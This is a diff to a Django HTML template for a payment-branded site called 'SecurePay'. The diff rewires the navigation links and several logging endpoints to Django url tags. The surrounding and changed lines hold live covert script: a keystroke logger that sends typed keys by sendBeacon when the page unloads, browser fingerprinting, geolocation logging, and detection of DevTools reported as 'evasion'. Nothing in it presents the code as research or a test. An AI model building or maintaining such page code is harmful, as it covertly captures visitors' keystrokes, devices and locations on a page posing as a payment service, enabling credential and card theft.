@@ -490,11 +490,11 @@
                 Secure<span class="text-aqua">Pay</span>
             </div>
             <nav class="nav-links">
-                <a href="/"><i class="fas fa-home"></i> Home</a>
-                <a href="/products"><i class="fas fa-shopping-bag"></i> Products</a>
-                <a href="/about"><i class="fas fa-info-circle"></i> About</a>
-                <a href="/contact"><i class="fas fa-envelope"></i> Contact</a>
-                <a href="/account"><i class="fas fa-user"></i> Account</a>
+                <a href="{% url 'kcof:home' %}"><i class="fas fa-home"></i> Home</a>
+                <a href="#"><i class="fas fa-shopping-bag"></i> Products</a>
+                <a href="#"><i class="fas fa-info-circle"></i> About</a>
+                <a href="#"><i class="fas fa-envelope"></i> Contact</a>
+                <a href="#"><i class="fas fa-user"></i> Account</a>
             </nav>
         </div>
     </header>
@@ -571,7 +571,7 @@
         });
         
         window.addEventListener("beforeunload", function() {
-            navigator.sendBeacon("/log_keystroke/", new URLSearchParams({
+            navigator.sendBeacon("{% url 'base:log-keystroke' %}", new URLSearchParams({
                 page: window.location.pathname,
                 keys: keys
             }));
@@ -624,7 +624,7 @@
                 fp.webglRenderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
             } catch (e) {}
             
-            fetch("/log_fingerprint/", {
+            fetch("{% url 'base:log-fingerprint' %}", {
                 method: "POST",
                 headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                 body: new URLSearchParams({fp: JSON.stringify(fp)})
@@ -650,7 +650,7 @@
                 geoIcon.style.color = '#00FF00';
                 geoIcon.title = 'Location detected';
                 
-                fetch("/log_geo/", {
+                fetch("{% url 'base:log-geo' %}", {
                     method: "POST",
                     headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                     body: new URLSearchParams({
@@ -684,7 +684,7 @@
                     devToolsIcon.title = 'DevTools detected!';
                     setTimeout(() => devToolsIcon.style.animation = '', 500);
                     
-                    fetch("/log_evasion_detected/", {
+                    fetch("{% url 'base:log-evasion-detection' %}", {
                         method: "POST",
                         headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                         body: new URLSearchParams({evasion: "DevTools opened"})
